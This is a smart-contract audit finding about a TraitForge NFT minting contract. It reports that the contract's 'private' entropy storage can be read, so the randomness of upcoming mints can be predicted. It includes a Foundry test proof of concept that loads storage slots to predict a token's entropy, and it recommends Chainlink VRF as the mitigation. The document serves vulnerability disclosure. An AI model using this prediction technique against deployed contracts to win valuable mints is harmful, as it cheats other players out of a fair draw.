# Vulnerability details

## Impact
By reading data from contract's storage, users can access privately declared variables that determine the entropy of tokens to be minted, giving them the ability to choose when to mint tokens to get a more valuable one.

## Proof of Concept
```
function testMintOnlyWantedNft() public {
        vm.warp(1722687775);
        vm.roll(1);
        vm.deal(alice, 1e18);

        vm.prank(owner);
        entropyGenerator.writeEntropyBatch1();

        bytes32[] memory proof;
        vm.prank(alice);
        traitForgeNft.mintToken{value: 0.1e18}(proof);
        
        //retrieve "private" slot and numberIndex
        uint256 slot = uint256(vm.load(address(entropyGenerator), bytes32(uint256(772))));
        uint256 numberIndex = uint256(vm.load(address(entropyGenerator), bytes32(uint256(773))));

        //predict entropy for the token to be minted next
        uint256 predictedEntropy = entropyGenerator.getPublicEntropy(slot, numberIndex);

        vm.prank(alice);
        traitForgeNft.mintToken{value: 0.1e18}(proof);

        //predicted entropy == minted token's entropy
        assertEq(predictedEntropy, traitForgeNft.getTokenEntropy(2));
    }
```

The above POC shows how by reading from storage a user can predict the entropy of the tokens to be minted next. Additionally with the knowledge of the current slot and number index, users can read the publicly declared *slotIndexSelectionPoint* && *numberIndexSelectionPoint* to know when to mint in order to obtain the Golden God NFT.

## Tools Used
Manual Review

## Recommended Mitigation Steps
To make the game entirely fair for all players, consider using an onchain verifiable random number generator like chainlink VRF.
